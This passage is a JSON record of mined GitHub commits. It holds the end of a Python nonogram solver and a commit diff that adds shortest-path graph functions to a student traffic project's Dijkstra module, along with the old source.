self.sums[other_is_row][a_idx + idx] += 1\n                self.jobs[(other_is_row, a_idx + idx, False)] += 100 \/ self.weight(self.sums[other_is_row][a_idx + idx])\n                self.jobs[(other_is_row, a_idx + idx, True)] += 1 \/ self.weight(self.sums[other_is_row][a_idx + idx])\n\n    @staticmethod\n    def update_soft(old_line, agg_line, new_line, a_idx, n_idx, first_time):\n        if np.logical_and(old_line[a_idx:a_idx+n_idx] != 0, old_line[a_idx:a_idx+n_idx] != new_line[:n_idx]).any():\n            return True  # still first time\n\n        if first_time:\n            agg_line[:] = new_line[:]\n        else:\n            agg_line[new_line != agg_line] = 0\n        return False\n\n    def solve_line(self, line_data, line_blx, other_is_row, use_brute_force):\n        grayed = np.nonzero(line_data == 0)\n        if len(grayed[0]) == 0:\n            return\n\n        (a_idx, a_blx) = self.pfx(line_data, line_blx, other_is_row)\n        (z_idx, z_blx) = self.sfx(line_data, line_blx, other_is_row)\n        if a_blx >= z_blx:\n            if a_idx < z_idx:\n                self.update(line_data, 2, a_idx, z_idx - a_idx, other_is_row)\n            return\n        if a_idx >= z_idx:\n            return\n\n        self.freedom_solve(line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row)\n        if use_brute_force:\n            self.brute_force(line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row)\n\n    def pfx(self, line_data, line_blx, other_is_row):\n        return self.pfx_internal(line_data, line_blx, 0, 0, other_is_row)\n\n    def sfx(self, line_data, line_blx, other_is_row):\n        (z_idx_inv, z_blx_inv) = self.pfx_internal(np.flip(line_data), list(reversed(line_blx)), 0, 0, other_is_row)\n        return len(line_data) - z_idx_inv, len(line_blx) - z_blx_inv\n\n    def pfx_internal(self, line_data, line_blx, a_idx, a_blx, other_is_row):\n        n_idx = len(line_data) - a_idx\n        n_blx = len(line_blx) - a_blx\n\n        if n_idx == 0:  # no line data\n            return a_idx, a_blx\n    \n        if n_blx == 0:  # no more blx\n            self.update(line_data, 2, a_idx, n_idx, other_is_row)\n            return a_idx+n_idx, a_blx+n_blx\n\n        current_blx = line_blx[a_blx]\n\n        if line_data[a_idx] == 1:\n            self.update(line_data, 1, a_idx, current_blx, other_is_row)\n            a_idx += current_blx\n            a_blx += 1\n            if len(line_data) > a_idx:\n                self.update(line_data, 2, a_idx, 1, other_is_row)\n                a_idx += 1\n            return self.pfx_internal(line_data, line_blx, a_idx, a_blx, other_is_row)\n        elif line_data[a_idx] == 2:\n            maybe_black = np.nonzero(line_data[a_idx:] != 2)\n            if len(maybe_black[0]) > 0:\n                a_idx = maybe_black[0][0] + a_idx\n                return self.pfx_internal(line_data, line_blx, a_idx, a_blx, other_is_row)\n            else:\n                raise Exception(\"Shouldn't get here\")\n        else:\n            blacked = np.nonzero(line_data[a_idx:a_idx + current_blx] == 1)\n            if len(blacked[0]) > 0 and 0 <= blacked[0][0] < current_blx:\n                first_blacked = blacked[0][0]\n                overflow = current_blx - first_blacked\n                if overflow > 0:\n                    self.update(line_data, 1, a_idx + first_blacked, overflow, other_is_row)\n            return a_idx, a_blx\n\n    def freedom_solve(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row):\n        n_idx = z_idx - a_idx\n        freedom = n_idx - sum(blx + 1 for blx in line_blx[a_blx:z_blx]) + 1\n        if freedom < max(line_blx[a_blx:z_blx]):\n            idx = a_idx\n            for blx in line_blx[a_blx:z_blx]:\n                blacks = blx - freedom\n                if blacks > 0:\n                    self.update(line_data, 1, idx + freedom, blacks, other_is_row)\n                idx = idx + blx + 1\n\n    def brute_force(self, line_data, line_blx, a_idx, z_idx, a_blx, z_blx, other_is_row):\n        n_idx = z_idx - a_idx\n        n_blx = z_blx - a_blx\n        freedom = n_idx - sum(blx + 1 for blx in line_blx[a_blx:z_blx]) + 1\n        possibilities = math.comb(freedom + n_blx, n_blx)\n        if possibilities > self.max_combination:\n            return\n\n        agg_line = np.zeros(n_idx)\n        first_time = True\n        list_of_combinations = combinations(range(freedom + n_blx), n_blx)\n        list_of_combinations = list(list_of_combinations)\n        random.shuffle(list_of_combinations)\n        for combo in list_of_combinations:\n            new_line = np.zeros(n_idx + 1)\n            idx = 0\n            blx = a_blx\n            for i in range(freedom + n_blx):\n                if i in combo:\n                    blx_len = line_blx[blx]\n                    new_line[idx:idx + blx_len] = np.ones(blx_len)\n                    idx += blx_len\n                    blx += 1\n                new_line[idx] = 2\n                idx += 1\n            new_line = new_line[:-1]\n            first_time = self.update_soft(line_data, agg_line, new_line, a_idx, n_idx, first_time) and first_time\n            if not first_time and not agg_line.any():\n                break\n        if first_time:\n            raise Exception(\"Dead end\")\n\n        return self.update(line_data, agg_line, a_idx, n_idx, other_is_row)\n\ndef test():\n    blx_x = [[1, 1], [1, 16], [19], [9], [2, 4],\n             [3, 10], [13], [16], [1, 19], [24],\n             [2, 3, 3, 8], [3, 3, 3, 1, 7], [1, 4, 2, 2, 7], [1, 3, 7], [1, 1, 1, 7],\n             [4, 1, 7], [1, 8], [1, 2, 7], [2, 6], [3, 1, 5],\n             [1, 1, 5], [2, 11], [5, 6, 1], [8, 1], [3, 1],\n             [3, 1], [4, 5], [4, 2, 2], [3, 3, 1], [4, 2]]\n    blx_y = [[1, 1], [1, 1, 3, 3], [2, 1, 1, 1, 5], [1, 1, 1, 1, 6], [1, 3, 4, 3, 5],\n             [4, 4, 6, 4], [1, 3, 2, 1, 1, 1, 3], [3, 2, 2, 1, 1, 1], [3, 5, 1], [3, 5, 1],\n             [3, 4, 1], [3, 3, 2, 1], [3, 7, 1], [2, 6, 2], [2, 5, 3, 1, 4],\n             [2, 5, 2, 1, 1, 1], [2, 5, 4, 1, 1, 2], [2, 6, 3, 1, 1], [2, 17, 2], [2, 17, 2],\n             [2, 17, 1], [2, 17, 1], [2, 17, 1], [3, 14, 7], [1, 10, 2]]\n    t = time.time()\n    Griddler(blx_x, blx_y).solve()\n    print(time.time() - t)\n\n\ntest()\n"}},"msg":"Under 1 second!\n\nImproved:\r\n1. Removed weights\r\n2. Ordered the jobs (exploiting non-brute-force and only then trying brute-force)\r\n3. Identifying blocks and splitting the work to two parts"}},"https:\/\/github.com\/ckatsube\/csc111-traffic-project":{"b47ba1c932e2460f19666230b8c4aa9c394be22a":{"url":"https:\/\/api.github.com\/repos\/ckatsube\/csc111-traffic-project\/commits\/b47ba1c932e2460f19666230b8c4aa9c394be22a","html_url":"https:\/\/github.com\/ckatsube\/csc111-traffic-project\/commit\/b47ba1c932e2460f19666230b8c4aa9c394be22a","message":"Added graph resizing (close to brute force, can be improved)","sha":"b47ba1c932e2460f19666230b8c4aa9c394be22a","keyword":"brute force improve","diff":"diff --git a\/pathcalculator.py b\/pathcalculator.py\nindex cbb309c..b8525fb 100644\n--- a\/pathcalculator.py\n+++ b\/pathcalculator.py\n@@ -15,41 +15,63 @@\n #############################################################################\n \n \n-def dijkstra(g: Graph, a: Any, b: Any) -> Path:\n-    \"\"\"Return the Path containing the smallest cumulative weight from point a to b\"\"\"\n+def get_shortest_path_map(g: Graph, start: Any, end: Any, points: list) -> dict[Any, dict[Any, Path]]:\n+    \"\"\"Return the mapping of relevant shortest paths between points from start to end\n \n-    # starts at the end because the path is built in reverse order\n-    v_end = g._vertices[a]\n-    p_end = _PathNode(v_end.item, 0)\n+    All internal points are mapped to all other internal points\n+    The start key is mapped to all internal points (one direction)\n+    All internal points are mapped to the end point (one direction)\n+    \"\"\"\n \n-    visited_vertices = {v_end: p_end}\n+    shortest_map = {start: {},\n+                    end: {}}\n+    for point in points:\n+        shortest_map[point] = {}\n \n-    heap = [p_end]\n+    for point in points:\n+        for other in points:\n+            if other != point:\n+                shortest_path = _dijkstra(g, point, other)\n+                reverse = shortest_path.get_reversed()\n \n-    def recursive_dijkstra() -> Path:\n-        \"\"\"Recursively calls the dijkstra alg on the globally accessible heap\"\"\"\n+                shortest_map[point][other] = shortest_path\n+                shortest_map[other][point] = reverse\n \n-        heap_is_not_empty = (heap != [])\n-        if heap_is_not_empty:\n+        from_start = _dijkstra(g, start, point)\n+        shortest_map[start][point] = from_start\n \n-            p = heapq.heappop(heap)\n-            v = g._vertices[p.get_item()]\n-            visited_vertices[v] = p\n+        to_end = _dijkstra(g, point, end)\n+        shortest_map[point][end] = to_end\n \n-            end_of_path = v.item == b\n-            if end_of_path:\n-                return p\n+    return shortest_map\n \n-            for neighbour, weight in v.neighbours.items():\n-                if neighbour not in visited_vertices:\n-                    next_path = _PathNode(neighbour.item, weight, p)\n-                    heapq.heappush(heap, next_path)\n \n-            return recursive_dijkstra()\n-        else:\n-            return _NullPathNode()\n+def get_shortest_graph(g: Graph, start: Any, end: Any, points: list) -> Graph:\n+    \"\"\"Return a graph containing information about the shortest distance between points\n \n-    return recursive_dijkstra()\n+    The subgraph containing the sub-points is a complete graph\n+    The start and end points are both connected to all internal points, but not to each other\n+    \"\"\"\n+\n+    shortest_map = get_shortest_path_map(g, start, end, points)\n+\n+    shortest_graph = Graph()\n+\n+    shortest_graph.add_vertex(start)\n+    shortest_graph.add_vertex(end)\n+    for point in points:\n+        shortest_graph.add_vertex(point)\n+\n+    for point, end_points in shortest_map.items():\n+        for end_point, path in end_points.items():\n+            shortest_graph.add_edge(point, end_point, path.get_path_weight(), 1)\n+\n+    return shortest_graph\n+\n+\n+def dijkstra(g: Graph, start: Any, end: Any) -> Path:\n+    \"\"\"Return the Path containing the smallest cumulative weight from point a to b\"\"\"\n+    return _dijkstra(g, start, end)\n \n \n class Path(Iterable):\n@@ -59,18 +81,22 @@ def __len__(self) -> int:\n         raise NotImplementedError\n \n     def get_weight(self) -> float:\n-        \"\"\"Return the weight of this _Node\"\"\"\n+        \"\"\"Return the weight of this Path\"\"\"\n         raise NotImplementedError\n \n     def get_path_weight(self) -> float:\n-        \"\"\"Return the cumulative weight along the path this _Node is a part of\"\"\"\n+        \"\"\"Return the cumulative weight along the path this Path is a part of\"\"\"\n         raise NotImplementedError\n \n     def get_item(self) -> Any:\n-        \"\"\"Return the item associated with this _Node\"\"\"\n+        \"\"\"Return the item associated with this Path\"\"\"\n+        raise NotImplementedError\n+\n+    def get_reversed(self) -> _Node:\n+        \"\"\"Return the Path in reverse order from self\"\"\"\n         raise NotImplementedError\n \n-    def __iter__(self) -> Iterator[Any]:\n+    def __iter__(self) -> _PathIterator[Any]:\n         \"\"\"Return an iterator that can traverse the path\"\"\"\n         raise NotImplementedError\n \n@@ -83,6 +109,44 @@ def __lt__(self, other: Path):\n # PRIVATE INTERFACE\n #############################################################################\n \n+\n+def _dijkstra(g: Graph, start: Any, end: Any) -> _Node:\n+    \"\"\"Return the _Node containing the smallest cumulative weight from point a to b\"\"\"\n+\n+    # starts at the end because the path is built in reverse order\n+    v_end = g._vertices[end]\n+    p_end = _PathNode(v_end.item, 0)\n+\n+    visited_vertices = {v_end: p_end}\n+\n+    heap = [p_end]\n+\n+    def recursive_dijkstra() -> _Node:\n+        \"\"\"Recursively calls the dijkstra alg on the globally accessible heap\"\"\"\n+\n+        heap_is_not_empty = (heap != [])\n+        if heap_is_not_empty:\n+\n+            p = heapq.heappop(heap)\n+            v = g._vertices[p.get_item()]\n+            visited_vertices[v] = p\n+\n+            end_of_path = v.item == start\n+            if end_of_path:\n+                return p\n+\n+            for neighbour, weight in v.neighbours.items():\n+                if neighbour not in visited_vertices:\n+                    next_path = _PathNode(neighbour.item, weight, p)\n+                    heapq.heappush(heap, next_path)\n+\n+            return recursive_dijkstra()\n+        else:\n+            return _NullPathNode()\n+\n+    return recursive_dijkstra()\n+\n+\n class _Node(Path, ABC):\n     \"\"\"Abstract Iterable class for hiding the interface for manually iterating through the path\"\"\"\n \n@@ -91,7 +155,7 @@ def get_next(self) -> _Node:\n         raise NotImplementedError\n \n     def __iter__(self) -> _PathIterator:\n-        return _PathIterator(self)\n+        return _ItemIterator(self)\n \n \n class _NullPathNode(_Node):\n@@ -109,6 +173,10 @@ def get_path_weight(self) -> float:\n         \"\"\"There is no path, hence no weight, so return 0\"\"\"\n         return 0\n \n+    def get_reversed(self) -> _Node:\n+        \"\"\"Return a copy of self since no reverse exists\"\"\"\n+        return _NullPathNode()\n+\n     def get_next(self) -> _Node:\n         \"\"\"Raise a stop iteration error because no next exists\"\"\"\n         raise StopIteration\n@@ -149,6 +217,14 @@ def get_item(self) -> Any:\n         \"\"\"Return the item associated with this _PathNode\"\"\"\n         return self._item\n \n+    def get_reversed(self) -> _Node:\n+        \"\"\"Return the _PathNode at the end of an entirely reversed chain\"\"\"\n+        parent = _NullPathNode()\n+        for node in _NodeIterator(self):\n+            parent = _PathNode(node.get_item(), node.get_weight(), parent)\n+\n+        return parent\n+\n     def get_next(self) -> _Node:\n         \"\"\"Return the _Node preceding this one in the path\"\"\"\n         return self._next\n@@ -163,17 +239,53 @@ def get_weight(self) -> float:\n \n \n class _PathIterator(Iterator[Any]):\n-    \"\"\"Iterator pattern class for iterating through the path formed by _PathNodes\n+    \"\"\"Iterator pattern class for iterating through a Path\"\"\"\n+\n+    def __next__(self) -> Any:\n+        raise NotImplementedError\n+\n+\n+class _ItemIterator(_PathIterator[Any]):\n+    \"\"\"Iterator pattern class for iterating through the items in a path formed by _PathNodes\n \n     Iterates through the _PathNode .next chain in order.\n     \"\"\"\n \n+    _wrapped_iterator: _NodeIterator\n+\n+    def __init__(self, initial_node: _Node):\n+        self._wrapped_iterator = _NodeIterator(initial_node)\n+\n+    def __next__(self) -> Any:\n+        node = self._wrapped_iterator.__next__()\n+        return node.get_item()\n+\n+\n+class _NodeIterator(_PathIterator[_Node]):\n+    \"\"\"Iterator pattern class for iterating through the _Node chain\"\"\"\n+\n     _current_node: _Node\n \n     def __init__(self, initial_node: _Node):\n         self._current_node = initial_node\n \n-    def __next__(self) -> Any:\n+    def __next__(self) -> _Node:\n         cur = self._current_node\n         self._current_node = self._current_node.get_next()\n-        return cur.get_item()\n+        return cur\n+\n+\n+m_g = Graph()\n+\n+m_g.add_vertex(1)\n+m_g.add_vertex(2)\n+m_g.add_vertex(3)\n+m_g.add_vertex(4)\n+\n+m_g.add_edge(1, 2, 10, 1)\n+m_g.add_edge(1, 3, 1, 1)\n+m_g.add_edge(2, 3, 1, 1)\n+m_g.add_edge(2, 4, 1, 1)\n+m_g.add_edge(3, 4, 10, 1)\n+\n+my_path = dijkstra(m_g, 1, 4)\n","files":{"\/pathcalculator.py":{"changes":[{"diff":"\n #############################################################################\n \n \n-def dijkstra(g: Graph, a: Any, b: Any) -> Path:\n-    \"\"\"Return the Path containing the smallest cumulative weight from point a to b\"\"\"\n+def get_shortest_path_map(g: Graph, start: Any, end: Any, points: list) -> dict[Any, dict[Any, Path]]:\n+    \"\"\"Return the mapping of relevant shortest paths between points from start to end\n \n-    # starts at the end because the path is built in reverse order\n-    v_end = g._vertices[a]\n-    p_end = _PathNode(v_end.item, 0)\n+    All internal points are mapped to all other internal points\n+    The start key is mapped to all internal points (one direction)\n+    All internal points are mapped to the end point (one direction)\n+    \"\"\"\n \n-    visited_vertices = {v_end: p_end}\n+    shortest_map = {start: {},\n+                    end: {}}\n+    for point in points:\n+        shortest_map[point] = {}\n \n-    heap = [p_end]\n+    for point in points:\n+        for other in points:\n+            if other != point:\n+                shortest_path = _dijkstra(g, point, other)\n+                reverse = shortest_path.get_reversed()\n \n-    def recursive_dijkstra() -> Path:\n-        \"\"\"Recursively calls the dijkstra alg on the globally accessible heap\"\"\"\n+                shortest_map[point][other] = shortest_path\n+                shortest_map[other][point] = reverse\n \n-        heap_is_not_empty = (heap != [])\n-        if heap_is_not_empty:\n+        from_start = _dijkstra(g, start, point)\n+        shortest_map[start][point] = from_start\n \n-            p = heapq.heappop(heap)\n-            v = g._vertices[p.get_item()]\n-            visited_vertices[v] = p\n+        to_end = _dijkstra(g, point, end)\n+        shortest_map[point][end] = to_end\n \n-            end_of_path = v.item == b\n-            if end_of_path:\n-                return p\n+    return shortest_map\n \n-            for neighbour, weight in v.neighbours.items():\n-                if neighbour not in visited_vertices:\n-                    next_path = _PathNode(neighbour.item, weight, p)\n-                    heapq.heappush(heap, next_path)\n \n-            return recursive_dijkstra()\n-        else:\n-            return _NullPathNode()\n+def get_shortest_graph(g: Graph, start: Any, end: Any, points: list) -> Graph:\n+    \"\"\"Return a graph containing information about the shortest distance between points\n \n-    return recursive_dijkstra()\n+    The subgraph containing the sub-points is a complete graph\n+    The start and end points are both connected to all internal points, but not to each other\n+    \"\"\"\n+\n+    shortest_map = get_shortest_path_map(g, start, end, points)\n+\n+    shortest_graph = Graph()\n+\n+    shortest_graph.add_vertex(start)\n+    shortest_graph.add_vertex(end)\n+    for point in points:\n+        shortest_graph.add_vertex(point)\n+\n+    for point, end_points in shortest_map.items():\n+        for end_point, path in end_points.items():\n+            shortest_graph.add_edge(point, end_point, path.get_path_weight(), 1)\n+\n+    return shortest_graph\n+\n+\n+def dijkstra(g: Graph, start: Any, end: Any) -> Path:\n+    \"\"\"Return the Path containing the smallest cumulative weight from point a to b\"\"\"\n+    return _dijkstra(g, start, end)\n \n \n class Path(Iterable):\n","add":47,"remove":25,"filename":"\/pathcalculator.py","badparts":["def dijkstra(g: Graph, a: Any, b: Any) -> Path:","    \"\"\"Return the Path containing the smallest cumulative weight from point a to b\"\"\"","    v_end = g._vertices[a]","    p_end = _PathNode(v_end.item, 0)","    visited_vertices = {v_end: p_end}","    heap = [p_end]","    def recursive_dijkstra() -> Path:","        \"\"\"Recursively calls the dijkstra alg on the globally accessible heap\"\"\"","        heap_is_not_empty = (heap != [])","        if heap_is_not_empty:","            p = heapq.heappop(heap)","            v = g._vertices[p.get_item()]","            visited_vertices[v] = p","            end_of_path = v.item == b","            if end_of_path:","                return p","            for neighbour, weight in v.neighbours.items():","                if neighbour not in visited_vertices:","                    next_path = _PathNode(neighbour.item, weight, p)","                    heapq.heappush(heap, next_path)","            return recursive_dijkstra()","        else:","            return _NullPathNode()","    return recursive_dijkstra()"],"goodparts":["def get_shortest_path_map(g: Graph, start: Any, end: Any, points: list) -> dict[Any, dict[Any, Path]]:","    \"\"\"Return the mapping of relevant shortest paths between points from start to end","    All internal points are mapped to all other internal points","    The start key is mapped to all internal points (one direction)","    All internal points are mapped to the end point (one direction)","    \"\"\"","    shortest_map = {start: {},","                    end: {}}","    for point in points:","        shortest_map[point] = {}","    for point in points:","        for other in points:","            if other != point:","                shortest_path = _dijkstra(g, point, other)","                reverse = shortest_path.get_reversed()","                shortest_map[point][other] = shortest_path","                shortest_map[other][point] = reverse","        from_start = _dijkstra(g, start, point)","        shortest_map[start][point] = from_start","        to_end = _dijkstra(g, point, end)","        shortest_map[point][end] = to_end","    return shortest_map","def get_shortest_graph(g: Graph, start: Any, end: Any, points: list) -> Graph:","    \"\"\"Return a graph containing information about the shortest distance between points","    The subgraph containing the sub-points is a complete graph","    The start and end points are both connected to all internal points, but not to each other","    \"\"\"","    shortest_map = get_shortest_path_map(g, start, end, points)","    shortest_graph = Graph()","    shortest_graph.add_vertex(start)","    shortest_graph.add_vertex(end)","    for point in points:","        shortest_graph.add_vertex(point)","    for point, end_points in shortest_map.items():","        for end_point, path in end_points.items():","            shortest_graph.add_edge(point, end_point, path.get_path_weight(), 1)","    return shortest_graph","def dijkstra(g: Graph, start: Any, end: Any) -> Path:","    \"\"\"Return the Path containing the smallest cumulative weight from point a to b\"\"\"","    return _dijkstra(g, start, end)"]},{"diff":"\n         raise NotImplementedError\n \n     def get_weight(self) -> float:\n-        \"\"\"Return the weight of this _Node\"\"\"\n+        \"\"\"Return the weight of this Path\"\"\"\n         raise NotImplementedError\n \n     def get_path_weight(self) -> float:\n-        \"\"\"Return the cumulative weight along the path this _Node is a part of\"\"\"\n+        \"\"\"Return the cumulative weight along the path this Path is a part of\"\"\"\n         raise NotImplementedError\n \n     def get_item(self) -> Any:\n-        \"\"\"Return the item associated with this _Node\"\"\"\n+        \"\"\"Return the item associated with this Path\"\"\"\n+        raise NotImplementedError\n+\n+    def get_reversed(self) -> _Node:\n+        \"\"\"Return the Path in reverse order from self\"\"\"\n         raise NotImplementedError\n \n-    def __iter__(self) -> Iterator[Any]:\n+    def __iter__(self) -> _PathIterator[Any]:\n         \"\"\"Return an iterator that can traverse the path\"\"\"\n         raise NotImplementedError\n \n","add":8,"remove":4,"filename":"\/pathcalculator.py","badparts":["        \"\"\"Return the weight of this _Node\"\"\"","        \"\"\"Return the cumulative weight along the path this _Node is a part of\"\"\"","        \"\"\"Return the item associated with this _Node\"\"\"","    def __iter__(self) -> Iterator[Any]:"],"goodparts":["        \"\"\"Return the weight of this Path\"\"\"","        \"\"\"Return the cumulative weight along the path this Path is a part of\"\"\"","        \"\"\"Return the item associated with this Path\"\"\"","        raise NotImplementedError","    def get_reversed(self) -> _Node:","        \"\"\"Return the Path in reverse order from self\"\"\"","    def __iter__(self) -> _PathIterator[Any]:"]},{"diff":"\n         raise NotImplementedError\n \n     def __iter__(self) -> _PathIterator:\n-        return _PathIterator(self)\n+        return _ItemIterator(self)\n \n \n class _NullPathNode(_Node):\n","add":1,"remove":1,"filename":"\/pathcalculator.py","badparts":["        return _PathIterator(self)"],"goodparts":["        return _ItemIterator(self)"]},{"diff":"\n \n \n class _PathIterator(Iterator[Any]):\n-    \"\"\"Iterator pattern class for iterating through the path formed by _PathNodes\n+    \"\"\"Iterator pattern class for iterating through a Path\"\"\"\n+\n+    def __next__(self) -> Any:\n+        raise NotImplementedError\n+\n+\n+class _ItemIterator(_PathIterator[Any]):\n+    \"\"\"Iterator pattern class for iterating through the items in a path formed by _PathNodes\n \n     Iterates through the _PathNode .next chain in order.\n     \"\"\"\n \n+    _wrapped_iterator: _NodeIterator\n+\n+    def __init__(self, initial_node: _Node):\n+        self._wrapped_iterator = _NodeIterator(initial_node)\n+\n+    def __next__(self) -> Any:\n+        node = self._wrapped_iterator.__next__()\n+        return node.get_item()\n+\n+\n+class _NodeIterator(_PathIterator[_Node]):\n+    \"\"\"Iterator pattern class for iterating through the _Node chain\"\"\"\n+\n     _current_node: _Node\n \n     def __init__(self, initial_node: _Node):\n         self._current_node = initial_node\n \n-    def __next__(self) -> Any:\n+    def __next__(self) -> _Node:\n         cur = self._current_node\n         self._current_node = self._current_node.get_next()\n-        return cur.get_item()\n+        return cur\n+\n+\n+m_g = Graph()\n+\n+m_g.add_vertex(1)\n+m_g.add_vertex(2)\n+m_g.add_vertex(3)\n+m_g.add_vertex(4)\n+\n+m_g.add_edge(1, 2, 10, 1)\n+m_g.add_edge(1, 3, 1, 1)\n+m_g.add_edge(2, 3, 1, 1)\n+m_g.add_edge(2, 4, 1, 1)\n+m_g.add_edge(3, 4, 10, 1)\n+\n+my_path = dijkstra(m_g, 1, 4)\n","add":39,"remove":3,"filename":"\/pathcalculator.py","badparts":["    \"\"\"Iterator pattern class for iterating through the path formed by _PathNodes","    def __next__(self) -> Any:","        return cur.get_item()"],"goodparts":["    \"\"\"Iterator pattern class for iterating through a Path\"\"\"","    def __next__(self) -> Any:","        raise NotImplementedError","class _ItemIterator(_PathIterator[Any]):","    \"\"\"Iterator pattern class for iterating through the items in a path formed by _PathNodes","    _wrapped_iterator: _NodeIterator","    def __init__(self, initial_node: _Node):","        self._wrapped_iterator = _NodeIterator(initial_node)","    def __next__(self) -> Any:","        node = self._wrapped_iterator.__next__()","        return node.get_item()","class _NodeIterator(_PathIterator[_Node]):","    \"\"\"Iterator pattern class for iterating through the _Node chain\"\"\"","    def __next__(self) -> _Node:","        return cur","m_g = Graph()","m_g.add_vertex(1)","m_g.add_vertex(2)","m_g.add_vertex(3)","m_g.add_vertex(4)","m_g.add_edge(1, 2, 10, 1)","m_g.add_edge(1, 3, 1, 1)","m_g.add_edge(2, 3, 1, 1)","m_g.add_edge(2, 4, 1, 1)","m_g.add_edge(3, 4, 10, 1)","my_path = dijkstra(m_g, 1, 4)"]}],"source":"\n\"\"\"Module for containing methods and classes related to calculating the shortest path \"\"\" from __future__ import annotations from abc import ABC from typing import Any, Iterable, Iterator import heapq Graph=__import__(\"Graph & Node\").Graph def dijkstra(g: Graph, a: Any, b: Any) -> Path: \"\"\"Return the Path containing the smallest cumulative weight from point a to b\"\"\" v_end=g._vertices[a] p_end=_PathNode(v_end.item, 0) visited_vertices={v_end: p_end} heap=[p_end] def recursive_dijkstra() -> Path: \"\"\"Recursively calls the dijkstra alg on the globally accessible heap\"\"\" heap_is_not_empty=(heap !=[]) if heap_is_not_empty: p=heapq.heappop(heap) v=g._vertices[p.get_item()] visited_vertices[v]=p end_of_path=v.item==b if end_of_path: return p for neighbour, weight in v.neighbours.items(): if neighbour not in visited_vertices: next_path=_PathNode(neighbour.item, weight, p) heapq.heappush(heap, next_path) return recursive_dijkstra() else: return _NullPathNode() return recursive_dijkstra() class Path(Iterable): \"\"\"Interface for getting information about a path\"\"\" def __len__(self) -> int: raise NotImplementedError def get_weight(self) -> float: \"\"\"Return the weight of this _Node\"\"\" raise NotImplementedError def get_path_weight(self) -> float: \"\"\"Return the cumulative weight along the path this _Node is a part of\"\"\" raise NotImplementedError def get_item(self) -> Any: \"\"\"Return the item associated with this _Node\"\"\" raise NotImplementedError def __iter__(self) -> Iterator[Any]: \"\"\"Return an iterator that can traverse the path\"\"\" raise NotImplementedError def __lt__(self, other: Path): \"\"\"Return whether this Path has a smaller weight than the other Path\"\"\" return self.get_path_weight() < other.get_path_weight() class _Node(Path, ABC): \"\"\"Abstract Iterable class for hiding the interface for manually iterating through the path\"\"\" def get_next(self) -> _Node: \"\"\"Return the _Node preceding this _Node in the path\"\"\" raise NotImplementedError def __iter__(self) -> _PathIterator: return _PathIterator(self) class _NullPathNode(_Node): \"\"\"Null object pattern to represent the end of a path\"\"\" def get_item(self) -> Any: \"\"\"Return None since this _Node has no item\"\"\" return None def get_weight(self) -> float: \"\"\"There is no parent, hence no weight, so return 0\"\"\" return 0 def get_path_weight(self) -> float: \"\"\"There is no path, hence no weight, so return 0\"\"\" return 0 def get_next(self) -> _Node: \"\"\"Raise a stop iteration error because no next exists\"\"\" raise StopIteration def __len__(self) -> int: return 0 class _PathNode(_Node): \"\"\"Path node for containing information about a path \"\"\" _item: Any _next: _PathNode _path_weight: float _weight: float _size: int def __init__(self, item: Any, weight: float, parent: _PathNode=_NullPathNode()): self._next=parent self._item=item self._size=len(parent) +1 self._weight=weight self._path_weight=parent.get_path_weight() +weight def __len__(self) -> int: return self._size def get_item(self) -> Any: \"\"\"Return the item associated with this _PathNode\"\"\" return self._item def get_next(self) -> _Node: \"\"\"Return the _Node preceding this one in the path\"\"\" return self._next def get_path_weight(self) -> float: \"\"\"Return the cumulative weight of this path\"\"\" return self._path_weight def get_weight(self) -> float: \"\"\"Return the weight of this path node to its parent\"\"\" return self._weight class _PathIterator(Iterator[Any]): \"\"\"Iterator pattern class for iterating through the path formed by _PathNodes Iterates through the _PathNode.next chain in order. \"\"\" _current_node: _Node def __init__(self, initial_node: _Node): self._current_node=initial_node def __next__(self) -> Any: cur=self._current_node self._current_node=self._current_node.get_next() return cur.get_item() ","sourceWithComments":"\"\"\"Module for containing methods and classes related to calculating the shortest path\n\"\"\"\n\nfrom __future__ import annotations\n\nfrom abc import ABC\nfrom typing import Any, Iterable, Iterator\n\nimport heapq\n\nGraph = __import__(\"Graph & Node\").Graph\n\n#############################################################################\n# PUBLIC INTERFACE\n#############################################################################\n\n\ndef dijkstra(g: Graph, a: Any, b: Any) -> Path:\n    \"\"\"Return the Path containing the smallest cumulative weight from point a to b\"\"\"\n\n    # starts at the end because the path is built in reverse order\n    v_end = g._vertices[a]\n    p_end = _PathNode(v_end.item, 0)\n\n    visited_vertices = {v_end: p_end}\n\n    heap = [p_end]\n\n    def recursive_dijkstra() -> Path:\n        \"\"\"Recursively calls the dijkstra alg on the globally accessible heap\"\"\"\n\n        heap_is_not_empty = (heap != [])\n        if heap_is_not_empty:\n\n            p = heapq.heappop(heap)\n            v = g._vertices[p.get_item()]\n            visited_vertices[v] = p\n\n            end_of_path = v.item == b\n            if end_of_path:\n                return p\n\n            for neighbour, weight in v.neighbours.items():\n                if neighbour not in visited_vertices:\n                    next_path = _PathNode(neighbour.item, weight, p)\n                    heapq.heappush(heap, next_path)\n\n            return recursive_dijkstra()\n        else:\n            return _NullPathNode()\n\n    return recursive_dijkstra()\n\n\nclass Path(Iterable):\n    \"\"\"Interface for getting information about a path\"\"\"\n\n    def __len__(self) -> int:\n        raise NotImplementedError\n\n    def get_weight(self) -> float:\n        \"\"\"Return the weight of this _Node\"\"\"\n        raise NotImplementedError\n\n    def get_path_weight(self) -> float:\n        \"\"\"Return the cumulative weight along the path this _Node is a part of\"\"\"\n        raise NotImplementedError\n\n    def get_item(self) -> Any:\n        \"\"\"Return the item associated with this _Node\"\"\"\n        raise NotImplementedError\n\n    def __iter__(self) -> Iterator[Any]:\n        \"\"\"Return an iterator that can traverse the path\"\"\"\n        raise NotImplementedError\n\n    def __lt__(self, other: Path):\n        \"\"\"Return whether this Path has a smaller weight than the other Path\"\"\"\n        return self.get_path_weight() < other.get_path_weight()\n\n\n#############################################################################\n# PRIVATE INTERFACE\n#############################################################################\n\nclass _Node(Path, ABC):\n    \"\"\"Abstract Iterable class for hiding the interface for manually iterating through the path\"\"\"\n\n    def get_next(self) -> _Node:\n        \"\"\"Return the _Node preceding this _Node in the path\"\"\"\n        raise NotImplementedError\n\n    def __iter__(self) -> _PathIterator:\n        return _PathIterator(self)\n\n\nclass _NullPathNode(_Node):\n    \"\"\"Null object pattern to represent the end of a path\"\"\"\n\n    def get_item(self) -> Any:\n        \"\"\"Return None since this _Node has no item\"\"\"\n        return None\n\n    def get_weight(self) -> float:\n        \"\"\"There is no parent, hence no weight, so return 0\"\"\"\n        return 0\n\n    def get_path_weight(self) -> float:\n        \"\"\"There is no path, hence no weight, so 